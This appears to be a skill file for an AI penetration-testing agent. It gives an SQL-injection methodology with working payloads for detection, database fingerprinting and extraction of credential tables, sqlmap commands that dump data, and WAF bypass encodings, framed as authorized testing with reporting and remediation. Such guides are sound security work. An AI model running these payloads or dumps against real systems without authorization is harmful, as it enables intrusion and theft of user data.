---
name: sql-injection-testing
description: Professional skills and methodology for SQL-injection testing
version: 1.0.0
---

# SQL-Injection Testing

## Overview

SQL injection is a common and dangerous web application vulnerability. This skill provides a systematic SQL-injection testing methodology, detection techniques, and exploitation strategies.

## Testing methodology

### 1. Parameter identification
- Identify every user input point: URL params, POST data, HTTP headers, cookies, etc.
- Focus on: `id`, `search`, `filter`, `sort`, and similar parameters
- Intercept and modify requests with Burp Suite or similar tools

### 2. Basic detection
- Single-quote test: `'` — look for SQL errors
- Boolean-based blind: `' AND '1'='1` vs `' AND '1'='2`
- Time-based blind: `' AND SLEEP(5)--`
- UNION query: `' UNION SELECT NULL--`

### 3. Database identification
- MySQL: `' AND @@version LIKE '%mysql%'--`
- PostgreSQL: `' AND version() LIKE '%PostgreSQL%'--`
- MSSQL: `' AND @@version LIKE '%Microsoft%'--`
- Oracle: `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Information extraction
- Database name: `' UNION SELECT database()--`
- Table names: `' UNION SELECT table_name FROM information_schema.tables--`
- Column names: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Data extraction: `' UNION SELECT username,password FROM users--`

## Tool usage

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Specify parameter
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# Specify DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# List databases
sqlmap -u "http://target.com/page?id=1" --dbs

# List tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Manual testing
- Burp Suite Repeater
- Browser developer tools
- Python scripts to automate testing

## Bypass techniques

### WAF bypass
- Encoding: URL encoding, Unicode, hex
- Comments: `/**/`, `--`, `#`
- Mixed case: `SeLeCt`, `UnIoN`
- Space substitution: `/**/`, `+`, `%09` (Tab), `%0A` (newline)

### Examples
```
Original: ' UNION SELECT NULL--
Bypass 1: '/**/UNION/**/SELECT/**/NULL--
Bypass 2: '%55nion%20select%20null--
Bypass 3: '/*!UNION*//*!SELECT*/null--
```

## Verification and reporting

### Verification steps
1. Confirm that SQL statements execute
2. Extract database information as proof
3. Assess the impact (data exfiltration, privilege escalation, etc.)
4. Record a complete PoC (request/response)
5. Log the confirmed vulnerability via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting essentials
- Vulnerability location and parameter
- Affected data and systems
- Complete exploitation steps
- Remediation advice (parameterized queries, input validation, etc.)

## Notes

- Test only in authorized environments
- Avoid damaging production data
- Be careful with dangerous operations like DROP and DELETE
- Record every testing step for reproducibility
